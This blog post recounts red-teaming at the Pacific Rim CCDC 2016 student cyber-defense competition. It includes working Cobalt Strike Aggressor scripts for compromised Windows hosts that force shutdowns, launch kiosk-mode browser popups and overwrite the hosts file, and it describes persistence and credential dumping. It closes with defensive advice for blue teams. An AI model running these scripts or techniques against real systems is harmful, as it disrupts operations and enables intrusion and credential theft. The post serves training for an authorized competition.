---
layout: post
title: Red Teaming for Pacific Rim CCDC 2016
summary: Preparation, Automation, Aggressor Scripts, and thoughts about 2016's Pacific Rim CCDC. 
tags:
- ccdc
- cobalt strike
- aggressor
commentIssueId: 12
---

Six weeks ago I had the opportunity to Red Team for [Pacific Rim CCDC](https://www.prccdc.org/). I love doing this competition because it gives me a chance to do things one would never be allowed to do on a real network and it forces me think about a different set of problems than a pentest or red team engagement. In this post I will discuss my thoughts and experiences before, during, and after this year's competition. 

# Preparation

[Last year]({{site.baseurl}}/2015-04-15-how-i-prepared-to-red-team-at-prccdc-2015/) I made a few goals for myself, mostly centered around preparation. About a month before the competition some friends and I collaborated to prepare for the competition.

## Operations Plan
The first piece of preparation is making an Operations Plan. The Ops Plan is a runbook of sorts containing all of the functionality we want to be able to execute during the competition. For each action or attack we listed out copy/paste commands, workflows, and/or tool modules. The goal is to minimize the amount of searching required during the competition. 

I've uploaded a sample from our Ops Plan to GitHub [here](https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt). Shoutout to [@sw4mp_f0x](https://twitter.com/sw4mp_f0x), [@beyondnegative](https://twitter.com/beyondnegative), [@ahayden](https://twitter.com/ahayden), and [@primarytyler](https://twitter.com/primarytyler) for working on prep with me.


## Automation
Once we had a foundational Ops Plan in place, the next step was to automate as many of the functions as possible. The competition is frenetic from start to finish, so the ability to execute attacks quickly is critical. The primary attack platform I planned on using was [Cobalt Strike](https://www.cobaltstrike.com/), with [Powershell Empire](http://www.powershellempire.com/) as a secondary platform. 

Cobalt Strike offers an extremely powerful built-in scripting language: [Aggressor](https://www.cobaltstrike.com/help-scripting). Versions of Cobalt Strike prior to 3.0 used [Cortana](http://www.advancedpentest.com/help-scripting-cortana) script, which is incompatible with Aggressor. This was my first foray into using Aggressor script and I am very happy that I dove in. Aggressor scripts provide the ability to extend Cobalt Strike's functionality and GUI with built-in commands as well as using the [Sleep](http://sleep.dashnine.org/manual/) language directly. Since Sleep allows Java objects to be incorporated into scripts, the usage options are nearly limitless.

### Shutdown
After reading Raphael Mudge's resources on Aggressor and Sleep (linked below), I started easy with a CCDC equivalent of *Hello World*: shutting down all selected boxes. 

```perl
popup beacon_bottom {
	menu "Lulz" {
		item "Shutdown Host" {
			prompt_confirm("Are you SURE you want to bounce the box(es)?", "Confirm", lambda({
				blog(@ids,"shutting down");
				bshell(@ids, "shutdown /s /f /t 00 -d up:125:1");
			}, @ids => $1));
		}
	}
}
```
Lines 1-3 configure the GUI, placing the context menu (right click) item *Shutdown Host* under a parent menu of *Lulz*. Lines 4-7 prompt the user for confirmation to shut down all hosts. If the user selects OK, all hosts are issued the shell command `shutdown /s /f /t 00 -d up:125:1`.

### Internet Explorer Popup
Last year we launched Internet Explorer in kiosk mode to Justin Bieber's homepage to spread some Bieber Fever to the Blue Teams. For this year, I wanted to automate this and be able to quickly change the URL Internet Explorer opens.

```perl
item "IE Kiosk Popup" {
		prompt_text("What site do you want to pop up?", "https://google.com", lambda({
			binput(@ids,"C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
			bshell(@ids, "C:\\Progra~1\\Intern~1\\iexplore.exe -k $1");
		}, @ids => $1));
}
```
To include this within the *Lulz* context menu parent, simply insert this code before the closing menu curly bracket, like this:

```perl
popup beacon_bottom {
	menu "Lulz" {		
		item "IE Kiosk Popup" { 
			CODE GOES HERE
		}
		item "Shutdown Host" { 
			CODE GOES HERE
		}
	}
}
```

### Host File Stomp
Blue Teams and Red Teams alike use the internet during the competition, researching how to remediate vulnerabilities, looking up that default credential for the router, the list goes on. The difference is that ideally the Blue Team's hosts are owned in multiple ways, so why not use that to our advantage to slow the research efforts? This script stomps the target(s) host file with a selected file and clears the DNS cache.

```perl
item "Replace Host File" {
	prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
		bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
		brm(@ids,"hosts");
		blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
		bupload(@ids,$1);
		bshell(@ids, "ipconfig /flushdns");
		blog(@ids,"File uploaded and DNS flushed. Done!");
	}, @ids => $1));
}
```

Line 2 prompts the user for a file. Once selected, the file is assigned the `$1` variable and the lambda function is evaluated. The lambda function is used to evaluate the lines within the parenthesis inline, lines 4 - 9 in this case. Those lines handle the removal of the current host file, upload of the selected file, and flushing of the hosts' DNS. 

### Script Files

I've uploaded these and a couple other scripts to my GitHub repo for [Aggressor scripts](https://github.com/bluscreenofjeff/AggressorScripts). These examples hopefully provide enough info to get your mind turning about other devious things you can cook up before next year's competition.

Having the ability to write Aggressor scripts to automate specific Red Team functions during the competition can be a real lifesaver. 

### Aggressor Script Resources:

* [Aggressor Script Intro](https://www.cobaltstrike.com/help-scripting)
* [Aggressor Script Documentation](https://www.cobaltstrike.com/aggressor-script/index.html)
* [My Cobalt Strike Scripts from NECCDC -- Raphael Mudge](http://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/)
* [Cobalt Strike 3.1 - Scripting Beacons -- Raphael Mudge](http://blog.cobaltstrike.com/2015/12/02/cobalt-strike-3-1-scripting-beacons/)
* [Real-Time Feed of Red Team Activity -- Raphael Mudge](http://blog.cobaltstrike.com/2016/01/13/real-time-feed-of-red-team-activity/)
* [Sleep Manual](http://sleep.dashnine.org/manual/)


# The Competition

This year my friend [@sw4mp_f0x](https://twitter.com/sw4mp_f0x) and I were on the Windows Meta Team together, which means we attacked every team's Windows boxes in effort to spread equal *love* to everyone. We both have competed together before, but not against every team; it was an exciting challenge. 

As soon as the competition started there was a mad dash for all teams to find initial access points. To do this we made up IP lists with all hosts for all teams and configured different initial access scripts (such as in Metasploit) to be ready for when new credentials were received. Nothing beats seeing those first few Beacons come rolling in at the start of the day. Once access started getting established it was critical to drop persistence as quickly as possible on as many hosts as possible. We used primarily scripted Aggressor to drop persistence. We came prepared with a few of these scripts but ended up making a few new ones on the fly and at the hotel at night.

With a baseline established, the name of the game was credential management. We needed to keep the credentials fresh and ready to go. With 12 teams and dozens of users per domain, this was not an easy task. In an environment like this (see: not trying to be quiet at all), I like to err on the side of dumping credentials and hashes now just in case I need them later. So once I compromised a domain controller a hashdump wasn't too far behind. You can imagine how Cobalt Strike's credential store looked. While this didn't pose an issue for some hosts, there were hosts present on all teams that shared IP addresses. This meant that any given credential on one of those hosts could belong to one or 12 different teams. Not ideal. 

Overall being on the Windows Meta Team was a challenge and a blast. I came away from the competition having learned some new tricks (like running *explorer.exe* on a sticky keys cmd prompt to use the GUI) and more ideas for both next year's competition and real life tests.

# After the Ruckus

The Blue Team debrief is particularly fun. Throughout the competition I find myself wondering what the Blue Team thinks of a particular attack or annoyance. Wondering if the defenders even know which systems we've compromised. The debrief is the time to answer a lot of those questions. I was able to speak with a few teams during the debrief, which was great.

Here are some of the key points and suggestions I made to Blue Teams:

* Become familiar with Red Team tactics. Knowing the pathways an attacker may try to get into your network will help you block those paths.
* Automate as much as you can. If the Red Team has a script to break something, have a script to fix it. Make sure you follow the rules about not using private scripts.
* Change passwords FREQUENTLY. There were accounts whose credentials didn't change once throughout the competition.
* Disable any account that's not needed or off-limits. If you aren't using built-in accounts, disable them all.
* Remove admin rights from any user or group that doesn't explicitly require that access. Given the size of the Blue Team's network, it may make sense to remove/disable Domain Admin rights entirely on the domain and explicitly assign rights on a per-host basis. For example, perhaps the Blue Team decides to disable all administrative groups in the domain and rely on local accounts with rotating unique passwords per-host. 
* Audit admin rights, account statuses, and new accounts (local and domain) throughout the competition.

# Closing Thoughts

The CCDC competition is a lot of fun. It's thrilling to be able to try attacks or annoy users in ways that are not fit for a production network. Doing that exercises a different part of your brain and hopefully conjure up some ideas that are suitable for real world testing. I can't wait for next year.
